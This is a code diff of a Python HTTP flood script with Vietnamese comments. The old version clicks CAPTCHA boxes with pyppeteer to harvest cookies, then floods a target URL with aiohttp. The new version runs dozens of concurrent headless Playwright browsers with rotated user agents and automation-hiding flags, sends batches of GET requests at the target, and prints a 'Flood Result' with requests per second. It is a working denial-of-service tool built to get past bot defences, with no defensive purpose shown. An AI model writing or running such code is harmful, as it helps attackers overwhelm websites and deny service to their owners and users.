@@ -1,97 +1,79 @@
-import os
-import sys
 import asyncio
 import random
 import time
-import json
-from pyppeteer import launch
-import aiohttp
+import os
+from playwright.async_api import async_playwright
 
-# ================= CONFIG =================
-TARGET_URL = os.getenv("TARGET_URL")
+TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
 DURATION = int(os.getenv("DURATION", "20"))   # giây
-MAX_TAB = int(os.getenv("MAX_TAB", "2"))      # số tab mở solve captcha
-MAX_RPS = int(os.getenv("MAX_RPS", "10"))     # rps mỗi tab (6-10)
+CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))  # số tab song song
+REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5"))  # số request song song mỗi vòng/tab
 
-if not TARGET_URL:
-    print("[ERROR] TARGET_URL environment variable not set")
-    sys.exit(1)
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
+]
+ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]
 
-# ==========================================
+success = 0
+fail = 0
+status_count = {}
 
-async def solve_captcha_and_get_cookie(tab_id: int):
-    """Mỗi tab mở solve captcha và lấy cookie"""
-    browser = await launch(headless=True,
-                           args=["--no-sandbox", "--disable-setuid-sandbox"])
-    page = await browser.newPage()
+async def attack(playwright, worker_id):
+    global success, fail, status_count
 
-    ua = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " \
-         f"(KHTML, like Gecko) Chrome/124.0.{tab_id} Safari/537.36"
-    await page.setUserAgent(ua)
+    ua = random.choice(USER_AGENTS)
+    lang = random.choice(ACCEPT_LANG)
 
-    await page.goto(TARGET_URL, {"waitUntil": "domcontentloaded"})
+    browser = await playwright.chromium.launch(
+        headless=True,
+        args=[
+            "--disable-web-security",
+            "--disable-features=IsolateOrigins,site-per-process",
+            "--disable-blink-features=AutomationControlled",
+            "--no-sandbox",
+            "--disable-dev-shm-usage"
+        ]
+    )
+    context = await browser.new_context(
+        user_agent=ua,
+        extra_http_headers={"Accept-Language": lang}
+    )
 
-    try:
-        box = await page.querySelector("iframe, div[role=checkbox]")
-        if box:
-            print(f"[TAB{tab_id}] Found captcha, clicking...")
-            await box.click()
-            await page.waitForTimeout(5000)
-    except Exception:
-        pass
+    start = time.time()
+    while time.time() - start < DURATION:
+        tasks = []
+        for _ in range(REQ_PER_LOOP):
+            tasks.append(context.request.get(TARGET_URL, timeout=10000))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-    cookies = await page.cookies()
-    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
+        for res in results:
+            if isinstance(res, Exception):
+                fail += 1
+                status_count["exception"] = status_count.get("exception", 0) + 1
+            else:
+                if res.ok:
+                    success += 1
+                    status_count[res.status] = status_count.get(res.status, 0) + 1
+                else:
+                    fail += 1
+                    status_count[res.status] = status_count.get(res.status, 0) + 1
+
     await browser.close()
 
-    print(f"[TAB{tab_id}] Got cookies")
-    return cookie_str, ua
-
-async def flood_worker(tab_id: int, cookie: str, ua: str, stop_time: float):
-    """Worker gửi request với cookie/UA lấy được"""
-    headers = {
-        "User-Agent": ua,
-        "Cookie": cookie,
-        "Accept": "*/*"
-    }
-    interval = 1.0 / MAX_RPS
-    sent = 0
-    errors = 0
-
-    async with aiohttp.ClientSession() as session:
-        while time.time() < stop_time:
-            start = time.time()
-            try:
-                async with session.get(TARGET_URL, headers=headers) as resp:
-                    await resp.text()
-                    sent += 1
-                    print(f"[TAB{tab_id}] {resp.status} (sent={sent})")
-            except Exception as e:
-                errors += 1
-                print(f"[TAB{tab_id}] ERR {e}")
-            elapsed = time.time() - start
-            if elapsed < interval:
-                await asyncio.sleep(interval - elapsed)
-
-    return sent, errors
-
 async def main():
-    stop_time = time.time() + DURATION
+    async with async_playwright() as p:
+        tasks = [attack(p, i) for i in range(CONCURRENCY)]
+        await asyncio.gather(*tasks)
 
-    # Solve captcha song song cho 2 tab
-    cookies_ua = await asyncio.gather(*[
-        solve_captcha_and_get_cookie(i+1) for i in range(MAX_TAB)
-    ])
-
-    # Flood song song
-    results = await asyncio.gather(*[
-        flood_worker(i+1, cookies_ua[i][0], cookies_ua[i][1], stop_time)
-        for i in range(MAX_TAB)
-    ])
-
-    total_sent = sum(r[0] for r in results)
-    total_err = sum(r[1] for r in results)
-    print(f"\n[SUMMARY] Sent={total_sent}, Errors={total_err}")
+    total = success + fail
+    print(f"\n=== Flood Result ===")
+    print(f"Total requests: {total}")
+    print(f"Success (2xx): {success}")
+    print(f"Fail/Blocked: {fail}")
+    print(f"RPS ~ {total / DURATION:.2f}")
+    print("Status breakdown:", status_count)
 
 if __name__ == "__main__":
     asyncio.run(main())
